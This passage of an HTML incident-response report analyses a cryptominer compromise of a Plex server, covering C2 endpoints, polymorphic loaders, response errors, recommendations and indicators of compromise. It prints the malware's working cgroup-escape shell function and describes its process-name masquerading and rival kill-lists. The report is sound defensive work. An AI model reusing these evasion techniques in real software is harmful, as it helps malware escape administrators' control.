+    <rect x="790" y="148" width="230" height="34" rx="9" fill="#171226" stroke="#463675"/><text x="905" y="170">de.moneroocean.stream:443</text>
+    <rect x="790" y="192" width="230" height="34" rx="9" fill="#171226" stroke="#463675"/><text x="905" y="214">gulf.moneroocean.stream:443</text>
+    <rect x="790" y="236" width="230" height="34" rx="9" fill="#171226" stroke="#463675"/><text x="905" y="258">sg.moneroocean.stream:443</text>
+  </g>
+  <rect x="790" y="288" width="230" height="52" rx="9" fill="#241016" stroke="#ff5c5c" stroke-dasharray="5,4"/>
+  <text x="905" y="309" fill="#ff9d9d" font-size="12" text-anchor="middle" font-weight="700">72.14.179.64:443</text>
+  <text x="905" y="325" fill="#8494a7" font-size="10.5" text-anchor="middle">shared loader/miner channel (fd 88/91)</text>
+  <text x="905" y="337" fill="#f472b6" font-size="10.5" text-anchor="middle">NEW IOC — send queues 285 B / 3,018 B pending</text>
+
+  <rect x="420" y="360" width="260" height="52" rx="9" fill="#141a14" stroke="#4ade80"/>
+  <text x="550" y="382" fill="#eef4fb" font-size="12.5" text-anchor="middle" font-weight="700">203.0.113.24 :32400</text>
+  <text x="550" y="399" fill="#8494a7" font-size="10.5" text-anchor="middle">legitimate remote Plex client — NOT an IOC</text>
+  <rect x="420" y="428" width="260" height="46" rx="9" fill="#1a1614" stroke="#6b4a1a"/>
+  <text x="550" y="448" fill="#ffb347" font-size="11.5" text-anchor="middle" font-weight="700">RIVAL ACTOR (targeted by this malware)</text>
+  <text x="550" y="464" fill="#8494a7" font-size="10.5" text-anchor="middle">130.94.112.0/24 · 89.125.187.222 · tcp/18899</text>
+
+  <g stroke="#8494a7" stroke-width="1.6" fill="none" opacity=".8">
+    <line x1="260" y1="89"  x2="416" y2="216" marker-end="url(#na)"/>
+    <line x1="260" y1="163" x2="416" y2="230" marker-end="url(#na)"/>
+    <line x1="260" y1="359" x2="416" y2="268" marker-end="url(#na)" stroke-dasharray="5,4"/>
+    <line x1="260" y1="433" x2="416" y2="280" marker-end="url(#na)" stroke-dasharray="5,4"/>
+    <line x1="790" y1="96"  x2="684" y2="224" marker-end="url(#na)"/>
+    <line x1="790" y1="165" x2="684" y2="238" marker-end="url(#na)" opacity=".45"/>
+    <line x1="790" y1="209" x2="684" y2="252" marker-end="url(#na)" opacity=".45"/>
+    <line x1="790" y1="253" x2="684" y2="266" marker-end="url(#na)" opacity=".45"/>
+    <line x1="790" y1="314" x2="684" y2="284" marker-end="url(#na)" stroke-dasharray="5,4"/>
+    <line x1="550" y1="302" x2="550" y2="356" marker-end="url(#na)"/>
+  </g>
+</svg>
+<figcaption>Fig. 4 — Live network posture at evidence collection (11:33, from ss -tanpo). Solid = established/observed traffic; dashed = newly attributed IOC; faded = configured but not active. TIME-WAIT remnants to 176.123.7.7 on :80/:443 show fresh C2 polling minutes before capture.</figcaption>
+</figure>
+
+<h3>9.1 Connection detail at capture</h3>
+<table>
+<tr><th>Remote endpoint</th><th>Held by</th><th>Interpretation</th></tr>
+<tr><td class="mono">205.172.58.170:443</td><td>miner fd 16, keepalive</td><td>us.moneroocean.stream — active mining channel (TLSv1.3)</td></tr>
+<tr><td class="mono">176.123.7.7 :80/:443 (5× TIME-WAIT)</td><td>—</td><td>C2 polling / payload fetches, minutes before capture</td></tr>
+<tr><td class="mono"><span class="new">85.137.54.178:18082</span></td><td>loader pid 1556693, fd 0, keepalive</td><td>Persistent loader C2 — IP absent from loader's visible strings (packed config)</td></tr>
+<tr><td class="mono"><span class="new">91.92.40.202:43365</span></td><td>PlexScriptHost pid 2300043, fd 95</td><td>Persistent bot C2</td></tr>
+<tr><td class="mono"><span class="new">72.14.179.64:443</span></td><td>all loader generations + miner, fd 88/91; PlexScriptHost fd 88 (3,018 B queued)</td><td>Shared C2/check-in channel — pending send queues indicate active upload at capture</td></tr>
+<tr><td class="mono">203.0.113.24:32400</td><td>inherited fd 88 across malware + Plex pid 1380 fd 61; EasyAudioEncode fd 96 (229,944 B queued)</td><td><strong>Legitimate remote Plex client</strong> (streaming session backlog) — initially mis-blocked during response (§13.1)</td></tr>
+</table>
+
+<!-- ============ 10. EVASION ============ -->
+<h2 id="s10"><span class="n">10</span>Evasion &amp; adversary capabilities</h2>
+
+<h3>10.1 Polymorphism — defeats hash-based detection</h3>
+<p>Every loader download produced a <em>mutated</em> binary: six distinct SHA-256 values across sizes
+473,610 / 473,612 / 473,628 / 473,645 / 473,676 / 473,826 bytes. Consequence, demonstrated three times
+during the response itself: hash sweeps reported <strong>"CLEAN" while 116 copies remained on disk</strong>.
+Detection on this family must be behavioral or pattern-based (name/size/location heuristics), never hash-based.
+The binary additionally strips its section-header table and is UPX-packed, degrading static analysis.</p>
+
+<figure>
+<svg viewBox="0 0 900 250" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <text x="20" y="26" fill="#eef4fb" font-size="13.5" font-weight="700">Loader variants by size (each = distinct SHA-256)</text>
+  <g>
+    <rect x="60"  y="150" width="90" height="50" fill="#38bdf8" rx="4"/><text x="105" y="142" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,826</text><text x="105" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">masked gen + .x</text>
+    <rect x="200" y="152" width="90" height="48" fill="#a78bfa" rx="4"/><text x="245" y="144" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,676</text><text x="245" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">.kpx (rival)</text>
+    <rect x="340" y="154" width="90" height="46" fill="#a78bfa" rx="4"/><text x="385" y="146" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,645</text><text x="385" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">poly copy</text>
+    <rect x="480" y="156" width="90" height="44" fill="#a78bfa" rx="4"/><text x="525" y="148" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,628</text><text x="525" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">poly copy</text>
+    <rect x="620" y="158" width="90" height="42" fill="#f472b6" rx="4"/><text x="665" y="150" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,612</text><text x="665" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">1st gen bot</text>
+    <rect x="760" y="160" width="90" height="40" fill="#ffb347" rx="4"/><text x="805" y="152" fill="#c9d4e0" font-size="11.5" text-anchor="middle">473,610</text><text x="805" y="216" fill="#8494a7" font-size="10.5" text-anchor="middle">cron instance</text>
+  </g>
+  <line x1="40" y1="200" x2="870" y2="200" stroke="#243040"/>
+  <text x="450" y="240" fill="#8494a7" font-size="11" text-anchor="middle">Size variation ≤ 0.05% — enough to change the hash on every single download.</text>
+</svg>
+<figcaption>Fig. 5 — Six observed loader builds. Size deltas of 2–66 bytes each produce completely distinct SHA-256 hashes.</figcaption>
+</figure>
+
+<h3>10.2 Process masquerading</h3>
+<ul>
+  <li>Loader threads set <code>comm</code> to <code>kthreadd</code> and render as bracketed <code>[kthreadd]</code> — the genuine PID-2 kernel thread.</li>
+  <li>The miner uses <code>ksoftirqd/0</code> and overwrote its <code>cmdline</code> with 42 newline bytes (not merely empty — the classic XMRig argv-overwrite trick).</li>
+  <li>Masked-name generation impersonates Plex's own binaries: <code>CrashUploader</code>, <code>PlexScriptHost</code>, <code>PlexTunerService</code> in the plex home directory.</li>
+  <li>Tells on this host: non-root ownership, <code>exe</code> symlink into <code>/tmp</code>, PPid 1, and empty/newline cmdlines.</li>
+</ul>
+
+<h3>10.3 cgroup escape</h3>
+<pre>escape() {
+  echo $$ &gt; /sys/fs/cgroup/cgroup.procs 2&gt;/dev/null || true
+  echo $$ &gt; /sys/fs/cgroup/init.scope/cgroup.procs 2&gt;/dev/null || true
+  for d in /sys/fs/cgroup/*/cgroup.procs; do echo $$ &gt; "$d" 2&gt;/dev/null; done
+}</pre>
+<p>Detaches the malware from the service cgroup so <code>systemctl stop</code> and per-unit resource limits never reach it.
+The response used this in reverse: post-remediation, <em>every</em> remaining plex process sat inside a legitimate
+<code>system.slice</code> unit — cgroup membership became the verification signal.</p>
+
+<h3>10.4 Rival eviction &amp; host preservation</h3>
+<p>Kill-lists over process/command patterns and iptables REJECT rules against rival networks, plus
+booby-trapped rival drop paths (<code>ln -sfn /dev/null</code> as plex; <code>chmod 000 + chattr +i</code> as root).
+Simultaneously a self-preservation whitelist (<code>ours()</code>) keeps genuine <code>Plex Media Server</code>,
+<code>Plex Transcoder</code>, <code>ffmpeg</code>, <code>EasyAudioEncoder</code> alive — the crew wants the media server (and its
+re-entry path) healthy.</p>
+
+<h3>10.5 Privilege-conditional behavior</h3>
+<p><code>fw()</code> and the hardening branch of <code>trap_drop()</code> are gated on <code>[ "$(id -u)" = 0 ]</code>.
+No iptables REJECT rules for 18899 / 130.94.112.0/24 / 89.125.187.222 existed in <code>iptables-save</code> —
+consistent with the malware never having run as root.</p>
+
+<!-- ============ 11. TWO ACTORS ============ -->
+<h2 id="s11"><span class="n">11</span>Evidence of a second actor</h2>
+<p>This crew's malware is aggressively anti-<em>other</em>-malware, and the artifacts show the rivalry was real on this host:</p>
+<ul>
+  <li><strong>Rival indicators targeted by the watchdog:</strong> process/command patterns <code>18899</code>, <code>plex_deploy</code>, <code>pd.sh</code>, <code>pd2.sh</code>, <code>pd3.sh</code>, <code>PLEX_FORCE_RESTART</code>, <code>PLEX_PROXY_ONLY</code>, <code>.kpx</code>, <code>kpxb</code>; networks <code>130.94.112.0/24</code>, <code>89.125.187.222</code>; plus kills of <code>systemctl restart plex</code> and generic <code>killall Plex</code> commands.</li>
+  <li><strong>Rival miners killed by name:</strong> xmrig, xmr-stak, minerd, cpuminer, kinsing, kdevtmpfsi, sysupdate, mylovelyminer, myawesomeproxy, x12345, pwnrig, redis-server-x.</li>
+  <li><strong>Physical evidence:</strong> a <code>.kpx</code> file (473,676 B, 2026-10-28 08:19) — a name on this crew's own rival list — was present on the host, indicating a rival payload landed and was evicted or fought over. <span style="color:var(--tx-dim)">[inferred from artifact naming]</span> A sample survives as <code>sample-473676</code>.</li>
+</ul>
+<div class="callout warn"><div class="t">Assessment</div>
+<p style="margin:4px 0">At least <strong>two distinct actors exploited the same Plex exposure</strong>. The scope of the rival's activity — what it
+did, how long it persisted, whether it left artifacts — was <strong>not determined</strong> before its payload was deleted.
+The rival-crew question is the largest open hole in the investigation (§15).</p></div>
+
+<!-- ============ 12. IMPACT ============ -->
+<h2 id="s12"><span class="n">12</span>Impact assessment</h2>
+
+<h3>12.1 Computational impact</h3>
+<ul>
+  <li>8 of 8 hardware threads saturated at ~100% each (398% observed on the process) for ~13 h 12 m of accumulated miner runtime; system load ~5 against 4 cores.</li>
+  <li>2.3 GB of 12.5 GB RAM permanently held by the RandomX dataset; no huge pages (unelevated), so mining was slightly less efficient than the crew intended.</li>
+  <li>Any Plex transcode or *arr activity during the window competed with the miner for CPU.</li>
+</ul>
+
+<h3>12.2 Financial impact (attacker revenue)</h3>
+<p>~1,200 H/s on MoneroOcean for ~13.2 h yields an expected payout on the order of <strong>0.0001–0.0002 XMR (a few
+US cents)</strong> to wallet <code>851PGy…Yq8b</code> worker <code>c83c820d</code>. The direct financial loss to the operator is electricity
+plus wear. The <em>real</em> cost sits in credential exposure and response effort — the "could have been worse" framing is
+literal: with the admin token and world-readable API keys in hand, the same access could have been monetized as
+proxy malware, ransomware staging, or account takeover.</p>
+
+<h3>12.3 Observed hashrate (final miner instance, 11:04–11:33)</h3>
+<figure>
+<svg viewBox="0 0 900 220" xmlns="http://www.w3.org/2000/svg" font-family="Segoe UI,Arial,sans-serif">
+  <g stroke="#1c2733" stroke-width="1">
+    <line x1="46" y1="178.7" x2="886" y2="178.7"/><line x1="46" y1="133.5" x2="886" y2="133.5"/>
+    <line x1="46" y1="88.3"  x2="886" y2="88.3"/><line x1="46" y1="43.1"  x2="886" y2="43.1"/>
+    <line x1="46" y1="20.5"  x2="886" y2="20.5" stroke="#2c3a4a"/>
+  </g>
+  <g font-size="10" fill="#5b6b7d" text-anchor="end">
+    <text x="41" y="182">500</text><text x="41" y="137">700</text><text x="41" y="92">900</text><text x="41" y="47">1100</text><text x="41" y="24">1200</text>
+  </g>
+  <rect x="46" y="20.5" width="840" height="17.4" fill="rgba(167,139,250,.08)"/>
+  <text x="880" y="34" font-size="9.5" fill="#a78bfa" text-anchor="end">nominal band ~1,150–1,210 H/s</text>
+  <polygon fill="rgba(56,189,248,.12)" points="46,190 46.0,20.1 53.2,24.3 60.5,20.0 67.7,25.2 75.0,22.4 82.2,21.0 89.4,21.9 96.7,19.9 103.9,27.2 111.2,22.1 118.4,22.3 125.7,21.9 132.9,20.0 140.1,20.5 147.4,22.4 154.6,23.6 161.9,23.8 169.1,24.4 176.3,26.9 183.6,23.0 190.8,23.6 198.1,22.5 205.3,24.5 212.6,22.1 219.8,23.7 227.0,22.1 234.3,28.0 241.5,52.1 248.8,46.1 256.0,27.5 263.2,36.2 270.5,24.5 277.7,26.0 285.0,21.6 292.2,24.8 299.4,23.1 306.7,23.0 313.9,35.7 321.2,48.2 328.4,180.3 335.7,20.9 342.9,22.4 350.1,23.0 357.4,26.0 364.6,33.8 371.9,22.4 379.1,21.0 386.3,19.6 393.6,19.2 400.8,20.4 408.1,22.0 415.3,20.9 422.6,19.7 429.8,19.1 437.0,20.7 444.3,18.8 451.5,20.0 458.8,23.5 466.0,19.1 473.2,19.5 480.5,19.2 487.7,18.5 495.0,20.4 502.2,18.8 509.4,20.2 516.7,19.5 523.9,19.4 531.2,18.7 538.4,20.6 545.7,19.8 552.9,19.0 560.1,19.3 567.4,19.2 574.6,19.7 581.9,19.2 589.1,18.9 596.3,19.1 603.6,19.7 610.8,19.8 618.1,19.0 625.3,20.0 632.6,20.9 639.8,19.0 647.0,18.8 654.3,19.3 661.5,20.4 668.8,19.7 676.0,19.3 683.2,19.5 690.5,20.4 697.7,19.5 705.0,19.6 712.2,25.9 719.4,20.1 726.7,20.9 733.9,19.6 741.2,19.2 748.4,20.6 755.7,25.8 762.9,21.1 770.1,19.7 777.4,22.1 784.6,22.3 791.9,20.8 799.1,20.7 806.3,28.5 813.6,26.3 820.8,27.9 828.1,25.4 835.3,25.9 842.6,26.9 849.8,24.0 857.0,24.7 864.3,20.5 871.5,21.3 878.8,22.8 886.0,23.4 886,190"/>
+  <polyline fill="none" stroke="#38bdf8" stroke-width="1.6" points="46.0,20.1 53.2,24.3 60.5,20.0 67.7,25.2 75.0,22.4 82.2,21.0 89.4,21.9 96.7,19.9 103.9,27.2 111.2,22.1 118.4,22.3 125.7,21.9 132.9,20.0 140.1,20.5 147.4,22.4 154.6,23.6 161.9,23.8 169.1,24.4 176.3,26.9 183.6,23.0 190.8,23.6 198.1,22.5 205.3,24.5 212.6,22.1 219.8,23.7 227.0,22.1 234.3,28.0 241.5,52.1 248.8,46.1 256.0,27.5 263.2,36.2 270.5,24.5 277.7,26.0 285.0,21.6 292.2,24.8 299.4,23.1 306.7,23.0 313.9,35.7 321.2,48.2 328.4,180.3 335.7,20.9 342.9,22.4 350.1,23.0 357.4,26.0 364.6,33.8 371.9,22.4 379.1,21.0 386.3,19.6 393.6,19.2 400.8,20.4 408.1,22.0 415.3,20.9 422.6,19.7 429.8,19.1 437.0,20.7 444.3,18.8 451.5,20.0 458.8,23.5 466.0,19.1 473.2,19.5 480.5,19.2 487.7,18.5 495.0,20.4 502.2,18.8 509.4,20.2 516.7,19.5 523.9,19.4 531.2,18.7 538.4,20.6 545.7,19.8 552.9,19.0 560.1,19.3 567.4,19.2 574.6,19.7 581.9,19.2 589.1,18.9 596.3,19.1 603.6,19.7 610.8,19.8 618.1,19.0 625.3,20.0 632.6,20.9 639.8,19.0 647.0,18.8 654.3,19.3 661.5,20.4 668.8,19.7 676.0,19.3 683.2,19.5 690.5,20.4 697.7,19.5 705.0,19.6 712.2,25.9 719.4,20.1 726.7,20.9 733.9,19.6 741.2,19.2 748.4,20.6 755.7,25.8 762.9,21.1 770.1,19.7 777.4,22.1 784.6,22.3 791.9,20.8 799.1,20.7 806.3,28.5 813.6,26.3 820.8,27.9 828.1,25.4 835.3,25.9 842.6,26.9 849.8,24.0 857.0,24.7 864.3,20.5 871.5,21.3 878.8,22.8 886.0,23.4"/>
+  <circle cx="241.5" cy="52.1" r="3.5" fill="#ffb347"/>
+  <text x="248" y="66" font-size="10" fill="#ffb347">11:11 — contention dip</text>
+  <circle cx="328.4" cy="180.3" r="3.5" fill="#ff5c5c"/>
+  <text x="336" y="184" font-size="10" fill="#ff5c5c">11:14:23 — 492.8 H/s (RandomX dataset re-init after restart)</text>
+  <circle cx="712.2" cy="25.9" r="3.5" fill="#ffb347"/>
+  <text x="719" y="40" font-size="10" fill="#ffb347">11:30 — detection in progress</text>
+  <line x1="46" y1="190" x2="886" y2="190" stroke="#243040"/>
+  <g font-size="10" fill="#5b6b7d" text-anchor="middle">
+    <text x="56.6" y="206">11:05</text><text x="201.4" y="206">11:10</text><text x="346.3" y="206">11:15</text><text x="491.1" y="206">11:20</text><text x="635.9" y="206">11:25</text><text x="780.8" y="206">11:30</text><text x="880" y="206">11:33</text>
+  </g>
+</svg>
+<figcaption>Fig. 6 — Ten-second instantaneous hashrate, 117 samples from ksoftirqd.mlog (final miner instance, 11:04:38–11:33:39). The 11:14 dip to 493 H/s corresponds to RandomX dataset re-initialization; minor dips at ~11:11 and ~11:30 coincide with disk/CPU contention from evidence collection and detection activity.</figcaption>
+</figure>
+<!-- ============ 13. RESPONSE ============ -->
+<h2 id="s13"><span class="n">13</span>Response, containment &amp; response errors</h2>
+
+<h3>13.1 Containment sequence</h3>
+<table>
+<tr><th style="width:170px">Time (Oct 28)</th><th>Action</th></tr>
+<tr><td>11:33</td><td>Evidence collection (426 files, 58 MB) — <strong>before</strong> any termination; 13 process images recovered via <code>/proc/PID/exe</code> including 3 unlinked (deleted) binaries</td></tr>
+<tr><td>11:34:52</td><td><strong>Round 1 begins.</strong> cron stopped (correct first move — the watchdog rewrites the crontab every 60 s, so killing processes first would have achieved nothing)</td></tr>
+<tr><td>11:34:52</td><td>plex crontab wiped (0 lines remain)</td></tr>
+<tr><td>11:35:02</td><td>plexmediaserver stopped</td></tr>
+<tr><td>11:35:02–11</td><td>All remaining uid-997 processes killed in 3 passes (21 → 16 → 18 PIDs)</td></tr>
+<tr><td>11:35:11</td><td>Payload files removed: <code>/tmp/.cache</code>, both <code>.cpuhp690</code> copies, <code>CrashUploader</code>, <code>PlexScriptHost</code>, <code>/dev/shm/.boat.lock</code></td></tr>
+<tr><td>11:35:12</td><td>ufw egress denied to 176.123.7.7 — and, mistakenly, 203.0.113.24 (§13.2); cron restarted</td></tr>
+<tr><td>~12:20</td><td>Operator upgrades Plex to 1.43.5.11079 (patched)</td></tr>
+<tr><td>12:28:12</td><td><strong>Round 2:</strong> exploit <code>zz55802.so</code>, boat-rc files, first-generation copies removed (45 artifacts); hash sweep still finds 38 files of variant <code>a0c56849…</code> in tmpfs; 80.87.206.86 denied</td></tr>
+<tr><td>12:36</td><td><strong>Round 3:</strong> pattern-based sweep removes the remaining 116 polymorphic copies</td></tr>
+<tr><td>12:37</td><td>Verification clean; load average <strong>0.39</strong>; Mesa VA-API symlink restored</td></tr>
+</table>
+
+<h3>13.2 Response errors and collateral impact</h3>
+<p>Recorded in full because they affect evidence interpretation and future process design.</p>
+<table>
+<tr><th style="width:60px">#</th><th>Error</th><th>Impact &amp; correction</th></tr>
+<tr><td>1</td><td><strong>Incorrect egress block.</strong> 203.0.113.24 was blocked as suspected C2 — it is a legitimate remote Plex client whose session socket was merely inherited by the malware.</td><td>Rule removed the same session; had it persisted, legitimate remote Plex access from that host would have broken.</td></tr>
+<tr><td>2</td><td><strong>Three hash-based sweeps reported false "CLEAN".</strong> (a) first sweep used <code>-xdev</code>, skipping <code>/dev/shm</code>; (b) the hash list omitted the <code>a0c56849…</code> variant; (c) even a complete 5-hash sweep missed 116 copies because the loader is polymorphic.</td><td>Only pattern-based enumeration found everything. Hash-based conclusions anywhere in this case are lower bounds.</td></tr>
+<tr><td>3</td><td><strong>Over-broad process termination.</strong> Round 1 executed <code>kill -9</code> against <em>every</em> uid-997 process, including legitimate <code>prowlarr</code>, <code>radarr</code>, <code>sonarr</code>, <code>sabnzbd</code> and two Docker containers.</td><td>All auto-restarted within ~13 s; any in-flight sabnzbd download was interrupted; the *arr <code>config.xml</code> mtimes of 11:35:11–13 are restart artifacts — <strong>not attacker activity</strong> (a classic false lead for re-analysis). The kill should have been scoped by <code>exe</code> path.</td></tr>
+<tr><td>4</td><td><strong>Legitimate file deleted.</strong> <code>radeonsi_drv_video.so</code> (146-byte symlink to the 50 MB Mesa VA-API driver) was misread as a truncated ELF and deleted; the conclusion was written into the same command as the check.</td><td>Symlink restored 12:37 with correct ownership.</td></tr>
+<tr><td>5</td><td><strong>Mixed-provenance evidence samples.</strong> <code>bin/round3/sample-*</code> was populated by size across <em>all</em> plex-owned files in drop directories, including benign JPEG/BMP media art.</td><td>Documented in the manifest; only samples 473628/473645/473676/1554/282 are malware.</td></tr>
+</table>
+
+<h3>13.3 What the response got right</h3>
+<ul>
+  <li><strong>Collection before termination</strong> — live process images, socket table, and /proc metadata were captured ~90 min before the first kill.</li>
+  <li><strong>Cron stopped first</strong> — the only correct order against a watchdog that rewrites cron every 60 s.</li>
+  <li><strong>Cgroup membership used as verification</strong> — turning the malware's own escape trick into a detection signal.</li>
+  <li><strong>Evidence directory excluded from all sweeps</strong> — preserved malware does not produce false positives.</li>
+  <li><strong>Errors documented in place</strong> — enabling exactly this kind of re-analysis.</li>
+</ul>
+
+<!-- ============ 14. RESIDUAL RISK ============ -->
+<h2 id="s14"><span class="n">14</span>Residual risk &amp; recommendations</h2>
+
+<table>
+<tr><th style="width:60px">Prio</th><th>Outstanding action</th><th>Detail</th></tr>
+<tr><td class="mono" style="color:var(--red)">P1</td><td><strong>Rotate the Plex account credential</strong></td><td>On plex.tv: sign out all devices, change password, enable 2FA. The admin token was exposed for ~14 h and malware removal does not invalidate it. <strong>Do this first.</strong></td></tr>
+<tr><td class="mono" style="color:var(--red)">P1</td><td><strong>Rotate all service API keys</strong></td><td>Prowlarr/Radarr/Sonarr API keys, seerr + cached keys, sabnzbd api/nzb keys — all readable by uid 997 during the dwell (three were world-readable). Permissions were hardened (→ 640) but the secrets themselves are unchanged; rotate in each web UI.</td></tr>
+<tr><td class="mono" style="color:var(--amber)">P2</td><td><strong>Decide network exposure before restarting Plex</strong></td><td>32400/tcp remains ALLOW from Anywhere (operator decision). Plex is currently stopped/disabled; starting it restores the original exposure. Prefer LAN-only, or Plex Relay without a forwarded port.</td></tr>
+<tr><td class="mono" style="color:var(--amber)">P2</td><td><strong>Apply the staged console fix and reboot</strong></td><td><code>fbcon=nodefer</code> is staged in <code>/etc/default/grub</code> but <code>update-grub</code> has not been run and the host has not been rebooted (61+ days uptime). The reboot also clears <code>/tmp</code> and <code>/dev/shm</code>.</td></tr>
+<tr><td class="mono" style="color:var(--green)">P3</td><td>Prune unused legacy plugin bundles</td><td><code>PBS Kids.bundle</code>, <code>CouchPotato.bundle</code> remain in the writable Plug-ins tree — the exact directory the attacker hid in.</td></tr>
+<tr><td class="mono" style="color:var(--green)">P3</td><td>Add alerting</td><td>Sustained high CPU; non-root processes with kernel-thread names; executable writes to <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code>; any non-empty <code>plex</code> crontab; <code>.so</code> files in the Codecs dir not matching <code>lib*_{decoder,encoder}.so</code>.</td></tr>
+<tr><td class="mono" style="color:var(--green)">P3</td><td>Harden tmpfs</td><td><code>noexec</code> on <code>/tmp</code>, <code>/var/tmp</code>, <code>/dev/shm</code> — all three were used as execution paths and none has a legitimate executable need here.</td></tr>
+<tr><td class="mono" style="color:var(--green)">P3</td><td>De-share uid 997</td><td>Give each *arr service its own uid — the shared account both widened the blast radius and directly caused the §13.3 #3 outage.</td></tr>
+<tr><td class="mono" style="color:var(--green)">P3</td><td>Keep Plex patched</td><td>Verify ≥ 1.43.3.10861 (currently 1.43.5.11079) and enable unattended upgrades; KEV listing on 2026-10-21 preceded compromise by six days.</td></tr>
+</table>
+
+<h3>14.1 Current protective state</h3>
+<pre>plexmediaserver:   inactive / disabled
+ufw egress denied: 176.123.7.7, 80.87.206.86
+plex crontab:      empty
+load average:      0.39</pre>
+
+<!-- ============ 15. LIMITATIONS ============ -->
+<h2 id="s15"><span class="n">15</span>Investigation limitations</h2>
+<ul>
+  <li><strong>No data-exfiltration determination.</strong> Egress volume was not reconstructed; no packet capture exists for the dwell period. The pending send queues on the C2 channels (285 B / 3,018 B) and a 229,944-byte EasyAudioEncode queue (legitimate client streaming) were not deep-inspected.</li>
+  <li><strong>No reverse engineering of the loader.</strong> Classification rests on strings, ELF structure, runtime behavior and scripts. The UPX-packed loader may have capabilities not described here — notably, the protocols spoken to the three newly attributed C2 endpoints (§9) are unknown.</li>
+  <li><strong>No root-compromise proof, only absence of evidence.</strong> Supporting "no escalation": all artifacts uid 997; <code>dpkg -V</code> clean; no new authorized_keys; no root crontab; no malicious system units; root-gated malware branches never executed. <em>Not performed:</em> full package verification, kernel-module integrity check, rootkit scan (rkhunter/chkrootkit were never run).</li>
+  <li><strong>Volatile evidence partially lost.</strong> Round 1 killed processes ~90 minutes after detection; no memory image was captured. Only /proc metadata and recovered exe images survive.</li>
+  <li><strong>Log coverage incomplete.</strong> Kernel ring buffer wrapped (61-day uptime); opensnitchd was running but its logs, while mentioned in the original manifest, were not present in the collected set and were never analyzed — they would be the first place to look for per-connection egress history.</li>
+  <li><strong>Rival-actor scope unassessed.</strong> The <code>.kpx</code> sample survives, but what the second actor did and when it first landed was never established.</li>
+  <li><strong>Chain-of-custody caveat.</strong> All evidence was collected live from the compromised host by a root shell — not a forensic disk image. Timestamps and tool output could in principle have been manipulated by a sufficiently privileged attacker, though no evidence of root access was found.</li>
+</ul>
+
+<!-- ============ APPENDIX A ============ -->
+<h2 id="a1"><span class="n">A</span>Appendix A — Indicators of compromise</h2>
+
+<h3>A.1 Network indicators</h3>
+<table>
+<tr><th>Indicator</th><th>Role</th><th>Status</th></tr>
+<tr><td class="mono">176.123.7.7 (:80/:443)</td><td>Primary C2 / payload host — <code>/bins/1</code>, <code>/bins/4</code>, <code>/A-plex</code>, <code>/_land/p</code>, <code>/ks/ksoftirqd.vlog</code>, <code>/A</code></td><td>blocked</td></tr>
+<tr><td class="mono">80.87.206.86 (:80/:18081)</td><td>Secondary dropper host — <code>/A</code> (all fetches timed out from this network)</td><td>blocked</td></tr>
+<tr><td class="mono"><span class="new">85.137.54.178:18082</span></td><td>Live loader C2 channel (fd 0, keepalive)</td><td>NEW — unblocked</td></tr>
+<tr><td class="mono"><span class="new">91.92.40.202:43365</span></td><td>Live PlexScriptHost C2 channel (fd 95)</td><td>NEW — unblocked</td></tr>
+<tr><td class="mono"><span class="new">72.14.179.64:443</span></td><td>Shared loader/miner channel (fd 88/91), pending send queues at capture</td><td>NEW — unblocked</td></tr>
+<tr><td class="mono">us|de|gulf|sg.moneroocean.stream:443</td><td>Mining pools (TLS, SNI); us = 205.172.58.170, TLS fp <code>239daadd…</code></td><td>open</td></tr>
+<tr><td class="mono">130.94.112.0/24 · 89.125.187.222 · tcp/18899</td><td>Rival actor (targeted by this malware)</td><td>context</td></tr>
+<tr><td class="mono">203.0.113.24:32400</td><td><strong>NOT an IOC</strong> — legitimate remote Plex client (real public IP sanitized to a RFC-5737 documentation address)</td><td>n/a</td></tr>
+</table>
+
+<h3>A.2 Cryptocurrency</h3>
+<pre>Monero wallet: 851PGyBc7mdh4L72Viz5f9QggJuAzFTP9JXdvngQJFNh5nwRb8dpNjgWCDDC5T7JJ7HcKoAsRG1JWjkq5HqvcEBYHi1Yq8b
+Worker/subid:  c83c820d</pre>
+
+<h3>A.3 File hashes (SHA-256) — non-exhaustive, loader is polymorphic</h3>
+<pre>476af0a0dbf06f544732f86a902ebc27f873a50707d60b3330a63761b44045d4  zz55802.so (stage-1 exploit payload, 1,036,800 B)
+1a831ecbb318c97cccf4d7c0a09b61a56d774b50bfd9cb7cf87b83881c819792  ksoftirqd (XMRig "kswap 6.26.0" miner, 9,657,791 B)
+12f348f103c2b65487836ef9399919a7d1001e03cdbb1d851a299b84a5a3f848  loader variant (473,826 B — masked gen + /dev/shm/.x)
+a0c5684937381fab384dcf2c86ef7424e9c262b1cc9115f1cb3be83248450562  loader variant (473,612 B — first-generation bot)
+bc481e5e054c3e4a6901bc3cc98d5f6e24c1cbea0287fbc149643f2d9f686fcc  loader variant (473,610 B — cron instance)
+2c27b231fdae276c7f44c977a9581a595cb53393f6b416283e15e48d8942b0be  loader variant (473,628 B)
+62dde33d406844997bd2664aa1e2b7cd74072891e9bb0c10ba0025da2a77096f  loader variant (473,645 B)
+1ad8552e678f480e3014e33ef87a7f4816703a5e5dca34685e610e4d24a01bd1  loader variant (473,676 B — .kpx, rival artifact)
+0b534e6608cf3e2f51a73d41d4b56c888c3cececf7d5fdff620f05c0f8cb8c28  .i second-stage dropper (1,554 B shell)
+4feb29f30b9d07d04e90ce62b054d8c27a3e1e99ad0470ca3c9a04a9b284d806  CrashUploader watchdog (3,573 B shell)
+94e05a99a5383088780f6f7461ad86112dc58edb2bdee569df0ddb5c99097c59  boat-rc shell persistence (87 B)</pre>
+
+<h3>A.4 Filesystem patterns (more reliable than hashes)</h3>
+<pre>/tmp/.cache/                            payload staging directory
+/tmp/.cache/.cpuhp690{,.loop,.beat,.tag}
+/tmp/.cache/ksoftirqd{,.json,.mlog,.mstat,.died,.dlurl,.dlerr}
+/tmp/.cache/.mine  /tmp/.cache/.mstat
+{/tmp,/var/tmp,/dev/shm}/.b&lt;PID&gt;        loader copy (executable)
